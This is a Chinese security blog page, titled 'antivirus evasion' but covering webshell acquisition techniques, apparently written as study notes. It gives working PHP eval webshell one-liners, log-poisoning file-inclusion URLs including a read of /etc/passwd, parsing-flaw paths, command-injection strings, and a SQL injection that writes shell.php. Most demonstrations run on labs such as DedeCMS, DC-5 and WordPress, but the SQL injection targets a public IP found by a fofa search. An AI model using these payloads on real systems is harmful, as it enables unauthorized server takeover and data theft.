@@ -1,0 +1,402 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>免杀 | Maxenton</title><meta name="author" content="Maxenton"><meta name="copyright" content="Maxenton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这是免杀的学习日记。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="免杀">
+<meta property="og:url" content="https://threeshui.github.io/2021/12/13/%E7%BD%91%E7%AB%99Getshell%E7%9A%84%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="Maxenton">
+<meta property="og:description" content="这是免杀的学习日记。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://threeshui.github.io/img/getshell.png">
+<meta property="article:published_time" content="2021-12-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-11T11:29:10.714Z">
+<meta property="article:author" content="Maxenton">
+<meta property="article:tag" content="信息安全">
+<meta property="article:tag" content="安全知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://threeshui.github.io/img/getshell.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://threeshui.github.io/2021/12/13/%E7%BD%91%E7%AB%99Getshell%E7%9A%84%E6%96%B9%E6%B3%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?2ec9fa90a95a4d6f2c1057f31b412d4a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Maxenton","link":"链接: ","source":"来源: Maxenton","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '免杀',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-11 19:29:10'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom/custom.css"><script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/getshell.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Maxenton</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">免杀</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-12T16:00:00.000Z" title="发表于 2021-12-13 00:00:00">2021-12-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-11T11:29:10.714Z" title="更新于 2022-11-11 19:29:10">2022-11-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/">安全知识</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="免杀"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src="https://img-blog.csdnimg.cn/53963e2a9b684d9c92ea4048093934ac.png" alt="在这里插入图片描述"></p>
+<p>&#x3D;&#x3D;PS：本篇文章仅用于学习笔记记录，不可用于其他用途。&#x3D;&#x3D;</p>
+<h2 id="一、通用getshell方法"><a href="#一、通用getshell方法" class="headerlink" title="一、通用getshell方法"></a>一、通用getshell方法</h2><h3 id="1、任意文件上传"><a href="#1、任意文件上传" class="headerlink" title="1、任意文件上传"></a>1、任意文件上传</h3><p>（1）注意编程语言  asp , aspx , php , jsp<br>（2）上传成功 , 但是访问直接下载文件 , 以文本展示 , 原因 : 文件没有被解析<br>（3）上传成功 , 蚁剑链接失败 , 原因 : 可能是对方有防护措施 , 拦截蚁剑的流量 , 可以在浏览器上访问页面是否存在 , 是否解析<br>（4）一般在测试中 , 不推荐直接上传一句话 , 如 php , 上传 phpinfo , 测试是否解析即可<br>&#x3D;&#x3D;PS：一定不要混乱上传，保持头脑理智。&#x3D;&#x3D;<br><strong>实战中遇到的偏多</strong></p>
+<h3 id="2、存在命令-x2F-代码执行的功能点"><a href="#2、存在命令-x2F-代码执行的功能点" class="headerlink" title="2、存在命令&#x2F;代码执行的功能点"></a>2、存在命令&#x2F;代码执行的功能点</h3><p>关于代码执行&#x2F;或者命令执行 , 这里也不过多介绍了 , 这里强调指的是在系统中自带存在的一些执行命令&#x2F;代码的功<br>能点 , 一般在网站后台存在 , 后面有案例演示 , 仍然是需要注意的点</p>
+<ol>
+<li>构造payload在原来的基础上实现任意命令的执行 , 比如 原本是 ping 127.0.0.1 , 构造<br>127.0.0.1 &amp;&amp; ipconfig , ipconfig 为任意命令<br><strong>实战中遇到的偏少</strong> , 很多业务系统后台不存在这样的功能点 , 但是一些设备的管理后台可能存在 , 如路由器管理等<br>案例演示<br><strong>dedecms&#x2F;织梦cms , 后台命令执行getshell</strong><br>环境搭建<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2021/zip/2942226/1640761153948-e2302869-fec2-4acb-967b-c0f04a2e4ec3.zip?OSSAccessKeyId=LTAI4GGhPJmQ4HWCmhDAn4F5&amp;Expires=1662538729&amp;Signature=IgGRNA6nX%2B0guPtcRVBTHgJjDHo%3D&amp;response-content-disposition=attachment%3Bfilename*%3DUTF-8%27%27DedeCMS-V5.7.82-UTF8.zip</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载好源码 , 解压到phpstudy www目录下</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PHP5.6 + mysql</span></span><br></pre></td></tr></table></figure>
+安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dede.com/install/</span><br></pre></td></tr></table></figure>
+<img src="https://img-blog.csdnimg.cn/img_convert/57b2fa4c8f0c5b72beae0c90dcf26723.png#crop=0&crop=0&crop=1&crop=1&id=wUodw&originHeight=798&originWidth=1622&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>下一步 , 下一步 , 默认安装即可<br>登录后台<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://dede.com/dede/login.php?gotopage=%2Fdede%2F</span><br><span class="line">admin</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>
+漏洞复现</li>
+</ol>
+<p>在dedecms后台广告管理，可以插入php任意代码 , 模块 –&gt;广告管理</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/201f92b2ce828f25464209b45afafc2e.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=599&id=ud779a3cd&name=image.png&originHeight=899&originWidth=1678&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119328&status=done&style=none&taskId=u17974a73-072a-47fc-a8ad-ca9d17eb980&title=&width=1118.6666666666667" alt="image.png"></p>
+<p>增加一个新广告，在广告内容框内可以插入php代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e2b7b85a6193de60ae610e96c71d58dd.png#crop=0&crop=0&crop=1&crop=1&id=KZRQb&originHeight=1232&originWidth=1947&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>点击代码查看文件路径</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/752ff1746c16ee6dcbba7976afcb19dc.png#crop=0&crop=0&crop=1&crop=1&id=wcrap&originHeight=429&originWidth=2234&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6ee4ca3fe8ea2ad89ac1dc562283b65e.png#crop=0&crop=0&crop=1&crop=1&id=PBrVG&originHeight=675&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>使用蚁剑链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dede.com/plus/ad_js.php?aid=1</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e0feee0c38508d949d2d7ed4a77bede4.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=693&id=u16fdcead&name=image.png&originHeight=1040&originWidth=1542&originalType=binary&ratio=1&rotation=0&showTitle=false&size=230568&status=done&style=none&taskId=u68283dae-f689-4a57-ba52-9ee23057075&title=&width=1028" alt="image.png"></p>
+<h3 id="3、图片马-x2F-日志配合文件包含getshell"><a href="#3、图片马-x2F-日志配合文件包含getshell" class="headerlink" title="3、图片马&#x2F;日志配合文件包含getshell"></a>3、图片马&#x2F;日志配合文件包含getshell</h3><p>这种方式getshell的前提 , 是要满足两个条件 , 一是存在上传点 , 可以上传图片马 , 这个基本上很好满足 , 因为大<br>部分提供服务的网站都有上传头像的地方 , 剩下的一个就是在该网站上找到文件包含的漏洞 , 然后通过文件包含图<br>片马实现getshell<br>还有一种方式就是通过包含日志实现getshell , 也很简单 , 这个时候我们只需要把payload写到日志 , 直接拼接在<br>url上 , 然后访问即可 , 此时会把url的内容写入到日志中 , 即把payload写到日志文件中 , 然后找到日志文件 , 通过<br>包含getshell<br><strong>实战中遇到的偏少</strong> , 因为文件包含漏洞 , 黑盒测试很难发现 , 除非你知道这个系统有文件包含的nday<br>案例演示<br><strong>DC5靶机演示 日志包含getshell</strong><br>下载地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-5,314/</span><br><span class="line">上课的时候 , 同学自己下载</span><br></pre></td></tr></table></figure>
+
+<p>参考DC-5 , 导入需要重试 , 点x , 拍快照</p>
+<p>靶机地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.44</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d2c6521567abd51599ee519f54a535c6.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=913&id=u979ef1a3&name=image.png&originHeight=1370&originWidth=2083&originalType=binary&ratio=1&rotation=0&showTitle=false&size=360364&status=done&style=none&taskId=u925af203-9e62-4b8e-b7bc-857d93f5769&title=&width=1388.6666666666667" alt="image.png"></p>
+<p>提交留言</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.44/thankyou.php?firstname=1&amp;lastname=1&amp;country=australia&amp;subject=111</span><br></pre></td></tr></table></figure>
+
+<p>通过观察2017的变化 , 该页面可能存在文件包含 , 但是不知道包含参数是什么 , fuzz(模糊测试) , 最终得到的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.44/thankyou.php?file=footer.php</span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.44/thankyou.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b522cac80c4ee5f16b659993661d0a10.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=575&id=u108a9b88&name=image.png&originHeight=862&originWidth=1959&originalType=binary&ratio=1&rotation=0&showTitle=false&size=201951&status=done&style=none&taskId=u2302e007-cdb0-431d-9b64-0b1b699c7dc&title=&width=1306" alt="image.png"></p>
+<p>漏洞利用 , 通过日志包含getshell</p>
+<p>payload写入日志文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/thankyou.php?flie=&lt;?php @eval($_POST[&#x27;yjh&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/af3cb92b8c95cb72ad958e7fc6097ce6.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=699&id=u107a1a5d&name=image.png&originHeight=1048&originWidth=1428&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46287&status=done&style=none&taskId=u65ea902a-2b38-45ee-bf86-9865a44fca2&title=&width=952" alt="image.png"></p>
+<p>通过包含getshell , 这里的nginx日志文件路径为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>最终使用蚁剑链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.44/thankyou.php?file=/var/log/nginx/access.log</span><br><span class="line">yjh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fff5c5cd4d2dbbb274fb6870389415a7.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=693&id=ub5fc3c3f&name=image.png&originHeight=1040&originWidth=1542&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153753&status=done&style=none&taskId=u08cdc15d-f14c-4d60-a923-bcdf2e0f635&title=&width=1028" alt="image.png"></p>
+<h3 id="4、解析漏洞getshell"><a href="#4、解析漏洞getshell" class="headerlink" title="4、解析漏洞getshell"></a>4、解析漏洞getshell</h3><p>解析漏洞getshell , 实际上也是配合 图片马&#x2F;日志 getshell , 这里借助web服务器的解析漏洞 , 实现非脚本文件后<br>缀解析成脚本的 , 这就需要大家在实战中 , 分辨出当前网站是使用了什么web服务器 , 以及利用的payload是什么<br><strong>IIS6.0解析漏洞</strong><br><code>http://www.xxx.com/xx.asp/xx.jpg</code><br><code>http://www.xxx.com/xx.asp/xx.txt</code><br><code>http://www.xxx.com/xx.asp/xx.asp;.jpg</code><br><strong>IIS7.0&#x2F;7.5、Nginx解析漏洞</strong><br><code>http://www.xxx.com/xx.jpg/.php</code><br>其中nginx解析漏洞与nginx、php版本无关,属于用户配置不当造成的解析漏洞<br><strong>Apache解析漏洞</strong><br><code>http://www.xxx.com/xx.php.owf.rar</code>从右到左解析，直到能解析出php为止<br><strong>实战中遇到的偏少</strong> , 因为对web服务器的版本或者配置有要求</p>
+<h3 id="5、文件编辑-x2F-文件写入getshell"><a href="#5、文件编辑-x2F-文件写入getshell" class="headerlink" title="5、文件编辑&#x2F;文件写入getshell"></a>5、文件编辑&#x2F;文件写入getshell</h3><p>这类方法getshell , 实际上和文件上传差不多 , 都是把一句话木马写到文件中 , 这个方法利用的前提就是你能找到<br>文件编辑&#x2F;写入的功能点 , 或者漏洞 , 然后对应编辑&#x2F;写入的文件是 可以解析的脚本文件 , 非 html , css等静态文件<br><strong>实战中遇到的一般</strong> , 看网站后台是否具有这样的功能点<br>这个和模板文件编辑 , getshell , 差不多 , 都是编辑文件 , <strong>案例在下面演示</strong></p>
+<h3 id="6、sql注入getshell"><a href="#6、sql注入getshell" class="headerlink" title="6、sql注入getshell"></a>6、sql注入getshell</h3><p>这个就要分数据库类型了<br>mysql数据库 , 通过注入写shell的三个前提</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.注入点是root权限</span><br><span class="line">2.知道网站的绝对路径</span><br><span class="line">3.mysql配置文件中的 secure_file_priv =&quot;&quot;</span><br></pre></td></tr></table></figure>
+<p>案例演示<br>sql-lab靶场<br>fofa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;sqlilabs&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.134.173:8080/sqlilabs/Less-2/?id=3</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3ac92141b983b19a496e6a6a59e9f3fa.png#crop=0&crop=0&crop=1&crop=1&id=gTQ72&originHeight=613&originWidth=2030&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>手工写入shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.134.173:8080/sqlilabs/Less-2/?id=3 and 1=2 union select 1,&#x27;&lt;?php @eval(\$_POST[x]);?&gt;&#x27;,3 into outfile &#x27;/var/www/html/shell.php&#x27; --+</span><br><span class="line"></span><br><span class="line">3 and 1=2 union select 1,&#x27;&lt;?php @eval(\$_POST[x]);?&gt;&#x27;,3 into outfile &#x27;/var/www/html/shell.php&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>蚁剑链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.134.173:8080/shell.php</span><br><span class="line">x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3837fa2465ec6c54c8b8f258bffe8576.png#crop=0&crop=0&crop=1&crop=1&id=y0qoe&originHeight=994&originWidth=1539&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/eab8398942eb64bf67d3a3a3989ba3e4.png#crop=0&crop=0&crop=1&crop=1&id=CJ59J&originHeight=994&originWidth=1539&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>如果对方是 sqlserver 数据库 , 需要是sa权限 , 调用 xp_cmdshell 执行系统命令 , getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inurl:&quot;.asp?id=&quot;</span><br><span class="line">其他google语句</span><br></pre></td></tr></table></figure>
+<h2 id="二、功能点的一些getshell"><a href="#二、功能点的一些getshell" class="headerlink" title="二、功能点的一些getshell"></a>二、功能点的一些getshell</h2><h3 id="1、数据库备份getshell"><a href="#1、数据库备份getshell" class="headerlink" title="1、数据库备份getshell"></a>1、数据库备份getshell</h3><p>这类手法 , getshell , 本质的原理是通过上传图片马 , 默认是非解析后缀 ,  然后通过数据库备份的功能 , 自定义备<br>份的文件 , 以及备份后保存的文件名 , 实现解析<br>台数据库备份getshell，上传图片马并获取图片马路径，通过数据库备份修改后缀名，getshell , 通常asp站点后台居多<br>主要就是将一句话图片木马备份成ASP脚本格式的文件。具体操作步骤如下<br>1.上传一个 一句话木马图片<br>由于我已经进入后台了，随意去后台找一个上传点上传一句话木马图片就可以了<br><img src="https://img-blog.csdnimg.cn/img_convert/eeeb550b8f743d57b2b44c7dedd461fb.png#crop=0&crop=0&crop=1&crop=1&id=LCD30&originHeight=539&originWidth=971&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>2.备份数据库那里，修改当前数据库路径，填写备份数据库名称<br>这里，修改当前数据库路径必须为上面刚刚上传的一句话木马图片的路径；这里我把备份数据库名称写为admintony.asp<br><img src="https://img-blog.csdnimg.cn/img_convert/2ccd196d4d7ee1333560617933245720.png#crop=0&crop=0&crop=1&crop=1&id=vsk4a&originHeight=640&originWidth=984&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>3.连接一句话木马<br>2、编辑器漏洞getshell<br>实战中直接搜索对应的编辑器 , 然后使用漏洞的payload打就完了 , 常见的编辑器有</p>
+<ul>
+<li>fckeditor</li>
+<li>ueditor</li>
+<li>等等 …</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2791b453d95387141d153e2c89d439ed.png#crop=0&crop=0&crop=1&crop=1&id=H4UlL&originHeight=665&originWidth=1943&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>一般在asp网站后台可能会遇到 , <strong>实战用到偏少</strong></p>
+<h3 id="3、模板文件编辑getshell"><a href="#3、模板文件编辑getshell" class="headerlink" title="3、模板文件编辑getshell"></a>3、模板文件编辑getshell</h3><p>这类手法就和前面文件编辑本质上是一样的 , 需要的前提条件就是 , 你编辑的文件是可以解析的 , 然后你可以写入<br>任意内容<br><strong>实战遇到偏多</strong><br>案例演示<br><strong>wordpress后台修改模板拿webshell</strong><br>环境搭建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/wordpress/pwnscriptum</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>网站安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.156:8080/wp-admin/install.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<p>登录后台</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.156:8080/wp-login.php</span><br></pre></td></tr></table></figure>
+<p>登录wordprees后台 选择 外观编辑<br><img src="https://img-blog.csdnimg.cn/img_convert/1f2907024b08e6d20d354380c63794dd.png#crop=0&crop=0&crop=1&crop=1&id=lHFq2&originHeight=1155&originWidth=1994&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>选择一个模板 , 这里使用404模板</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/48623495d25740f167d8c71b988b7124.png#crop=0&crop=0&crop=1&crop=1&id=Ugszf&originHeight=1133&originWidth=2540&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>然后写入一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;yjh&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/49155103bf80d9b0471abca8f3ea74d8.png#crop=0&crop=0&crop=1&crop=1&id=r9F7B&originHeight=1292&originWidth=1774&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>然后保存 , 蚁剑链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.156:8080/wp-content/themes/twentyfifteen/404.php     # 默认404路径</span><br><span class="line">yjh</span><br></pre></td></tr></table></figure>
